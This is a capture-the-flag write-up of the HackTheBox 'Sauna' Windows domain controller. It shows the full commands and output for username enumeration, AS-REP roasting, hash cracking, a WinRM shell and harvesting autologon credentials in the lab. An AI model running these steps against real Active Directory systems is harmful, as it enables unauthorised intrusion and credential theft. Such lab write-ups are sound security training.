22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-aj5jodn5>2024-04-01</span></div><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-aj5jodn5><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-aj5jodn5>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-aj5jodn5><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-aj5jodn5>/</div><a href=/archive/tag/Windows/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Windows tag" data-astro-cid-aj5jodn5>Windows</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-aj5jodn5>/</div><a href=/archive/tag/Easy/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Easy tag" data-astro-cid-aj5jodn5>Easy</a></div></div></div></div><div class="overflow-hidden relative rounded-xl onload-animation banner-container mb-8"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" decoding=async height=375 loading=lazy src=/_astro/featured.6Abtm396_ZLYAgO.webp width=666 class="w-full h-full object-cover" style=object-position:center></div><div class="onload-animation mb-6 custom-md dark:prose-invert markdown-content max-w-none prose prose-base" data-pagefind-body><p>Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&#x26;#039;t require Kerberos pre-authentication.</p><p>This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&#x26;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\SYSTEM.</p><h2 id=initial-recon><span style=color:#33acff>Initial Recon</span><a href=#initial-recon class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> ping -c 1 10.10.10.175</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PING</span><span style=color:#79b8ff> 10.10.10.175</span><span style=color:#e1e4e8> (10.10.10.175) 56(</span><span style=color:#b392f0>84</span><span style=color:#e1e4e8>) bytes of data.</span></span>
<span class=line><span style=color:#b392f0>64</span><span style=color:#9ecbff> bytes</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> 10.10.10.175:</span><span style=color:#9ecbff> icmp_seq=</span><span style=color:#79b8ff>1</span><span style=color:#9ecbff> ttl=</span><span style=color:#79b8ff>127</span><span style=color:#9ecbff> time=</span><span style=color:#79b8ff>140</span><span style=color:#9ecbff> ms</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>---</span><span style=color:#79b8ff> 10.10.10.175</span><span style=color:#9ecbff> ping</span><span style=color:#9ecbff> statistics</span><span style=color:#79b8ff> ---</span></span>
<span class=line><span style=color:#b392f0>1</span><span style=color:#9ecbff> packets</span><span style=color:#9ecbff> transmitted,</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> received,</span><span style=color:#9ecbff> 0%</span><span style=color:#9ecbff> packet</span><span style=color:#9ecbff> loss,</span><span style=color:#9ecbff> time</span><span style=color:#9ecbff> 0ms</span></span>
<span class=line><span style=color:#b392f0>rtt</span><span style=color:#9ecbff> min/avg/max/mdev</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> 139.637/139.637/139.637/0.000</span><span style=color:#9ecbff> ms</span></span>
<span class=line></span></code></pre><p>We can see from the port scan it leaks the Domain EGOTISTICAL-BANK.LOCAL. There are also three services that have a goof attack surface http 80, smb 445 and ldap 389.</p><p>We can also look and see that this is probably a domain controller. Having ports; 53 DNS, 88 Kerberos and 445 are common DC ports.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap </span></span>
<span class=line></span></code></pre><table><thead><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr></thead><tbody><tr><td>53</td><td>domain</td><td>Simple DNS Plus</td><td></td></tr><tr><td>80</td><td>HTTP</td><td>Microsoft IIS httpd</td><td>10.0</td></tr><tr><td>88</td><td>kerberos-sec</td><td>Microsoft Windows Kerberos</td><td></td></tr><tr><td>135</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr><tr><td>139</td><td>netbios-ssn</td><td>Microsoft Windows netbios-ssn</td><td></td></tr><tr><td>389</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP</td><td></td></tr><tr><td>445</td><td>microsoft-ds</td><td></td><td></td></tr><tr><td>464</td><td>kpasswd5</td><td></td><td></td></tr><tr><td>593</td><td>ncacn_http</td><td>Microsoft Windows RPC over HTTP</td><td>1.0</td></tr><tr><td>636</td><td>tcpwrapped</td><td></td><td></td></tr><tr><td>3268</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP</td><td></td></tr><tr><td>3269</td><td>tcpwrapped</td><td></td><td></td></tr><tr><td>5985</td><td>http</td><td>Microsoft HTTPAPI httpd</td><td>2.0</td></tr><tr><td>9389</td><td>mc-nmf</td><td>.NET Message Framing</td><td></td></tr><tr><td>49667</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr><tr><td>49677</td><td>ncacn_http</td><td>Microsoft Windows RPC</td><td>HTTP 1.0</td></tr><tr><td>49676</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr><tr><td>49677</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr><tr><td>49706</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr><tr><td>49775</td><td>msrpc</td><td>Microsoft Windows RPC</td><td></td></tr></tbody></table><h2 id=active-directory><span style=color:#33acff>Active Directory</span><a href=#active-directory class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><h3 id=web---port-80>Web - Port 80<a href=#web---port-80 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p><img alt=img decoding=async height=707 loading=lazy src=/_astro/1.Bll6-k4P_ZN39W9.webp width=1088></p><p>On the about page <a href=http://10.10.10.175/about.html>http://10.10.10.175/about.html</a>, we can see that there is a “Meet The Team” section and find a handful of people. I recorded each of the name in the file called listUsers.txt.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> cat listUsers.txt </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Fergus</span><span style=color:#9ecbff> Smith</span></span>
<span class=line><span style=color:#b392f0>Shaun</span><span style=color:#9ecbff> Coins</span></span>
<span class=line><span style=color:#b392f0>Hugo</span><span style=color:#9ecbff> Bear</span></span>
<span class=line><span style=color:#b392f0>Bowie</span><span style=color:#9ecbff> Taylor</span></span>
<span class=line><span style=color:#b392f0>Sophie</span><span style=color:#9ecbff> Driver</span></span>
<span class=line><span style=color:#b392f0>Steven</span><span style=color:#9ecbff> Kerb</span></span>
<span class=line></span></code></pre><p>Next I’ll use a tool called username-anarchy to transform the word list of names to one with common usernames schemas, Tool Here</p><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>> ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast > users.txt</span></span>
<span class=line><span></span></span></code></pre><p>I’ll also add Administrator to the file as well.</p><h3 id=smb---port-445-recon>SMB - Port 445 Recon<a href=#smb---port-445-recon class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>I like to use crackmapexec to enumerate SMB.</p><p>We can see the hostname, domain and see idf SMBv1 is enable.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec smb 10.10.10.175  </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 x64 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p>We cant view any shares.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec smb 10.10.10.175 --shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 x64 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</span></span>
<span class=line></span></code></pre><p>Sometimes we can try doing a null session to see if we can get anything else. A null sessions is simply providing nothing for the username and password. But still nothing.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec smb 10.10.10.175 --shares -u </span><span style=color:#9ecbff>''</span><span style=color:#e1e4e8> -p </span><span style=color:#9ecbff>''</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 x64 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [+] EGOTISTICAL-BANK.LOCAL</span><span style=color:#79b8ff>\:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [-] Error enumerating shares: STATUS_ACCESS_DENIED</span></span>
<span class=line></span></code></pre><p>We can also try another tool called smbmap to see if it gives us anything different but it doesn’t.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> smbmap -H 10.10.10.175</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[+] IP: 10.10.10.175:445        Name: 10.10.10.175 </span></span>
<span class=line></span></code></pre><h3 id=kerbrute>Kerbrute<a href=#kerbrute class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Now that I have a list of posible usernames i can use a tool called kerbrute to test and see if any of the usernames are valid.</p><p>The cool thing about kerburte is it won’t create event id 4625 in the logs. Event id 4625 will document every failed log-on. This will instead create a Kerberos Failure event id 4771, its not logged by default.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>2024/02/18</span><span style=color:#9ecbff> 09:31:07</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  Using</span><span style=color:#9ecbff> KDC</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>s</span><span style=color:#e1e4e8>)</span><span style=color:#9ecbff>:</span></span>
<span class=line><span style=color:#b392f0>2024/02/18</span><span style=color:#9ecbff> 09:31:07</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  	10.10.10.175:88</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>2024/02/18</span><span style=color:#9ecbff> 09:31:07</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL</span></span>
<span class=line><span style=color:#b392f0>2024/02/18</span><span style=color:#9ecbff> 09:31:07</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  Done!</span><span style=color:#9ecbff> Tested</span><span style=color:#79b8ff> 12</span><span style=color:#9ecbff> usernames</span><span style=color:#e1e4e8> (1 </span><span style=color:#9ecbff>valid</span><span style=color:#e1e4e8>) in 0.285 seconds</span></span>
<span class=line></span></code></pre><h3 id=kerberoast>Kerberoast<a href=#kerberoast class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Now that we have two valid usernames we can leverage some impacket scripts Impacket github. The one I used on this machine was GetNPUser.py which will do an AS_REP Roast/Kerberoast.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith </span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50</span></span>
<span class=line></span></code></pre><p>Now that we have a hash we can use hashcat to crack it, I did this on my host machine to utileze a GPU. we get a hit and now have a creds fsmith<thestrokes23></thestrokes23></p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> .</span><span style=color:#79b8ff>\h</span><span style=color:#e1e4e8>ascat.exe -m 18200 ..</span><span style=color:#79b8ff>\h</span><span style=color:#e1e4e8>ash ..</span><span style=color:#79b8ff>\r</span><span style=color:#e1e4e8>ockyou.txt --force</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>fsmith:Thestrokes23</span></span>
<span class=line></span></code></pre><h3 id=smb-pt2>SMB PT2<a href=#smb-pt2 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Now that we have some valid credentials fsmith<thestrokes23></thestrokes23>we can try and authenticate to SMB again using crackmapexec and we can see that we have valid creds!</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 x64 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [+] EGOTISTICAL-BANK.LOCAL</span><span style=color:#79b8ff>\f</span><span style=color:#e1e4e8>smith:Thestrokes23 </span></span>
<span class=line></span></code></pre><p>Next I will enumerate shares and one sticks out RICOH Aficio SP 8300DN PCL 6</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 x64 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [+] EGOTISTICAL-BANK.LOCAL</span><span style=color:#79b8ff>\f</span><span style=color:#e1e4e8>smith:Thestrokes23 </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#e1e4e8>            [+] Enumerated shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            Share</span><span style=color:#9ecbff>           Permissions</span><span style=color:#9ecbff>     Remark</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#79b8ff>            -----</span><span style=color:#79b8ff>           -----------</span><span style=color:#79b8ff>     ------</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            ADMIN</span><span style=color:#e1e4e8>$                          </span><span style=color:#9ecbff>Remote</span><span style=color:#9ecbff> Admin</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            C</span><span style=color:#e1e4e8>$                              </span><span style=color:#9ecbff>Default</span><span style=color:#9ecbff> share</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            IPC</span><span style=color:#e1e4e8>$            </span><span style=color:#9ecbff>READ</span><span style=color:#9ecbff>            Remote</span><span style=color:#9ecbff> IPC</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            NETLOGON</span><span style=color:#9ecbff>        READ</span><span style=color:#9ecbff>            Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            print</span><span style=color:#e1e4e8>$          </span><span style=color:#9ecbff>READ</span><span style=color:#9ecbff>            Printer</span><span style=color:#9ecbff> Drivers</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            RICOH</span><span style=color:#9ecbff> Aficio</span><span style=color:#9ecbff> SP</span><span style=color:#9ecbff> 8300DN</span><span style=color:#9ecbff> PCL</span><span style=color:#79b8ff> 6</span><span style=color:#9ecbff>                 We</span><span style=color:#9ecbff> cant</span><span style=color:#9ecbff> print</span><span style=color:#9ecbff> money</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    445</span><span style=color:#9ecbff>    SAUNA</span><span style=color:#9ecbff>            SYSVOL</span><span style=color:#9ecbff>          READ</span><span style=color:#9ecbff>            Logon</span><span style=color:#9ecbff> server</span><span style=color:#9ecbff> share</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#e1e4e8>                                                                                                      </span></span>
<span class=line></span></code></pre><p>Taking a look at searchsploit there are a handful of exploits for this but we need a shell first. We can see that we can authenticate with winrm.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> crackmapexec winrm 10.10.10.175 -u </span><span style=color:#9ecbff>'fsmith'</span><span style=color:#e1e4e8> -p </span><span style=color:#9ecbff>'Thestrokes23'</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.10.175</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   SAUNA</span><span style=color:#e1e4e8>            [*] Windows 10.0 Build 17763 (</span><span style=color:#b392f0>name:SAUNA</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:EGOTISTICAL-BANK.LOCAL</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>HTTP</span><span style=color:#79b8ff>        10.10.10.175</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   SAUNA</span><span style=color:#e1e4e8>            [*] http://10.10.10.175:5985/wsman</span></span>
<span class=line><span style=color:#b392f0>WINRM</span><span style=color:#79b8ff>       10.10.10.175</span><span style=color:#79b8ff>    5985</span><span style=color:#9ecbff>   SAUNA</span><span style=color:#e1e4e8>            [+] EGOTISTICAL-BANK.LOCAL</span><span style=color:#79b8ff>\f</span><span style=color:#e1e4e8>smith:Thestrokes23 (</span><span style=color:#b392f0>Pwn3d!</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p>I’ll use evil-winrm to get shell.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23</span></span>
<span class=line></span></code></pre><p>Taking a look at the Desktop we can grab our user flag.</p><h2 id=privilege-escalation><span style=color:#33acff>Privilege Escalation</span><a href=#privilege-escalation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><h3 id=lateral-movement>Lateral movement<a href=#lateral-movement class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>I uploaded a great tool called winPEAS that is great for some automation when trying to escalate. I uploaded it using Evil-Winrm</p><pre class="astro-code github-dark" data-language=powershell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>*</span><span style=color:#e1e4e8>Evil</span><span style=color:#f97583>-</span><span style=color:#e1e4e8>WinRM</span><span style=color:#f97583>*</span><span style=color:#e1e4e8> PS C:\Temp</span><span style=color:#f97583>></span><span style=color:#e1e4e8> upload </span><span style=color:#79b8ff>winPEASx64.exe</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#e1e4e8>                                        </span></span>
<span class=line><span style=color:#e1e4e8>Info: Uploading </span><span style=color:#f97583>/</span><span style=color:#e1e4e8>home</span><span style=color:#f97583>/</span><span style=color:#e1e4e8>mhil4ne</span><span style=color:#f97583>/</span><span style=color:#e1e4e8>Downloads</span><span style=color:#f97583>/</span><span style=color:#79b8ff>winPEASx64.exe</span><span style=color:#e1e4e8> to C:\Temp\</span><span style=color:#79b8ff>winPEASx64.exe</span></span>
<span class=line><span style=color:#e1e4e8>                                        </span></span>
<span class=line><span style=color:#f97583>Data</span><span style=color:#e1e4e8>: </span><span style=color:#79b8ff>3183272</span><span style=color:#e1e4e8> bytes of </span><span style=color:#79b8ff>3183272</span><span style=color:#e1e4e8> bytes copied</span></span>
<span class=line><span style=color:#e1e4e8>                                        </span></span>
<span class=line><span style=color:#e1e4e8>Info: Upload successful</span></span>
<span class=line></span></code></pre><p>We get a lot of output from this but one section sticks outs particularly, the AutoLogon A service account has an auto logon enabled and we can harvest svc_loanmgr<moneymakestheworldgoround></moneymakestheworldgoround>! as valid credentials.</p><p><img alt=img decoding=async height=91 loading=lazy src=/_astro/2.DpF7ZHXD_5wQNP.webp width=640></p><p>We can try those credentials with Evil-Winrm and we get in</p><pre class="astro-code github-dark" data-language=powershell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> evil</span><span style=color:#f97583>-</span><span style=color:#e1e4e8>winrm </span><span style=color:#f97583>-</span><span style=color:#e1e4e8>u svc_loanmgr </span><span style=color:#f97583>-</span><span style=color:#e1e4e8>i </span><span style=color:#79b8ff>10.10</span><span style=color:#e1e4e8>.</span><span style=color:#79b8ff>10.175</span><span style=color:#f97583> -</span><span style=color:#e1e4e8>p Moneymakestheworldgoround</span><span style=color:#f97583>!</span></span>
<span class=line></span>
<span class=line><span style=color:#f97583>*</span><span style=color:#e1e4e8>Evil</span><span style=color:#f97583>-</span><span style=color:#e1e4e8>WinRM</span><span style=color:#f97583>*</span><span style=color:#e1e4e8> PS C:\Users\svc_loanmgr\Documents</span><span style=color:#f97583>></span><span style=color:#e1e4e8> </span></span>
